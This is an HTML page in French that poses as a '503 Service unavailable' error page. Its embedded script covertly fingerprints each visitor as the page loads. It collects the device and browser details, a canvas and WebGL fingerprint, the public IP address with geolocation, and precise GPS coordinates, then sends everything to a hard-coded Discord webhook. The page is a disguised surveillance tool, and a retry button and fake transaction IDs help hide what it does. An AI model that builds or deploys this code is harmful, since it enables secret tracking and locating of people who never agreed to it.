<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Erreur 503 - Service indisponible</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0a0a0a;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    h1 { color: #ff4444; font-size: 6rem; margin: 0; }
    h2 { color: #ff9800; margin: 10px 0 30px; }
    .code { font-family: monospace; font-size: 1.4rem; color: #ff6b6b; }
    button {
      background: #ff4444;
      color: white;
      border: none;
      padding: 14px 32px;
      font-size: 1.2rem;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 30px;
    }
    button:hover { background: #d32f2f; }
    pre { 
      background: #111; 
      padding: 20px; 
      border-radius: 8px; 
      max-width: 90%; 
      overflow: auto; 
      text-align: left; 
      margin-top: 40px; 
      font-size: 0.85rem;
    }
    footer { position: absolute; bottom: 20px; font-size: 0.9rem; opacity: 0.6; }
  </style>
</head>
<body>
  <h1>503</h1>
  <h2>Service temporairement indisponible</h2>
  <p class="code">Le serveur rencontre un probl√®me technique.<br>Nos √©quipes interviennent. R√©essayez dans quelques instants.</p>

  <button onclick="location.reload()">R√©essayer</button>

  <footer>ID transaction : ERR-<span id="txid"></span> ‚Ä¢ Ref: <span id="ref"></span></footer>

  <pre id="collected">Chargement des informations...</pre>

  <script>
    document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
    document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();

    let infos = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      referrer: document.referrer || 'direct',
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages || [],
      platform: navigator.platform,
      vendor: navigator.vendor,
      screen: `${screen.width}√ó${screen.height} (${screen.colorDepth} bits)`,
      availScreen: `${screen.availWidth}√ó${screen.availHeight}`,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation ? screen.orientation.type : null,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
      deviceMemory: navigator.deviceMemory || 'inconnu',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      online: navigator.onLine
    };

    // === IP + G√©olocalisation compl√®te ===
    async function getIPAndGeo() {
      try {
        // IP simple + geo riche
        const [ipRes, geoRes] = await Promise.all([
          fetch('https://api.ipify.org?format=json'),
          fetch('https://freeipapi.com/api/json/')
        ]);
        
        const ipData = await ipRes.json();
        const geoData = await geoRes.json();

        infos.ip = ipData.ip;
        infos.geo = {
          city: geoData.cityName,
          region: geoData.regionName,
          country: geoData.countryName,
          countryCode: geoData.countryCode,
          latitude: geoData.latitude,
          longitude: geoData.longitude,
          isp: geoData.isp || geoData.connection?.isp,
          asn: geoData.asn
        };
      } catch(e) {
        infos.ip = "erreur r√©cup√©ration IP";
        infos.geo = "erreur";
      }
    }

    // === Empreintes avanc√©es ===
    function addFingerprints() {
      // Canvas
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.fillText("OSINT test êê∑", 2, 15);
        infos.canvasFingerprint = canvas.toDataURL();
      } catch(e) { infos.canvasFingerprint = "non support√©"; }

      // WebGL
      try {
        const glCanvas = document.createElement('canvas');
        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
        if (gl) {
          const debug = gl.getExtension('WEBGL_debug_renderer_info');
          infos.webgl = {
            vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null,
            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null
          };
        }
      } catch(e) {}

      // AudioContext fingerprint
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        infos.audioContext = "support√©";
      } catch(e) { infos.audioContext = "non support√©"; }
    }

    // === Envoi vers Discord ===
    async function sendToDiscord() {
      document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);

      const embed = {
        embeds: [{
          title: "üö® Nouvelle visite - Tracking OSINT",
          color: 0xff0000,
          fields: [
            { name: "IP Publique", value: infos.ip || "Non r√©cup√©r√©e", inline: true },
            { name: "Pays / Ville", value: `${infos.geo?.country || "?"} - ${infos.geo?.city || "?"}`, inline: true },
            { name: "User-Agent", value: "```" + (infos.userAgent || "?").substring(0, 300) + "```", inline: false },
            { name: "√âcran", value: infos.screen, inline: true },
            { name: "Fuseau horaire", value: infos.timezone, inline: true },
            { name: "Connexion", value: infos.connection ? `${infos.connection.type} (${infos.connection.downlink} Mbps)` : "?", inline: true },
            { name: "G√©oloc", value: infos.geo?.latitude ? `${infos.geo.latitude}, ${infos.geo.longitude}` : "Refus√©e", inline: false },
            { name: "Mat√©riel", value: `C≈ìurs: ${infos.hardwareConcurrency} | RAM: ${infos.deviceMemory}Go`, inline: true },
            { name: "Canvas / WebGL", value: infos.canvasFingerprint ? "‚úÖ Fingerprint pr√©sent" : "‚ùå", inline: true }
          ],
          footer: { text: `ID: ERR-${Date.now().toString(36).toUpperCase()} ‚Ä¢ ${new Date().toLocaleString('fr-FR')}` },
          timestamp: infos.timestamp
        }]
      };

      fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
      }).catch(err => console.error("Erreur Discord:", err));
    }

    // Lancement
    async function start() {
      addFingerprints();
      await getIPAndGeo();
      showAndSend();   // ‚Üê d√©fini plus bas
    }

    function showAndSend() {
      sendToDiscord();
    }

    // G√©olocalisation + d√©marrage
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          infos.geo = infos.geo || {};
          infos.geo.latitude = pos.coords.latitude;
          infos.geo.longitude = pos.coords.longitude;
          infos.geo.accuracy = pos.coords.accuracy;
          start();
        },
        () => start(),
        { enableHighAccuracy: true, timeout: 12000 }
      );
    } else {
      start();
    }

    // Envoi de secours
    setTimeout(start, 8000);
  </script>
</body>
</html>
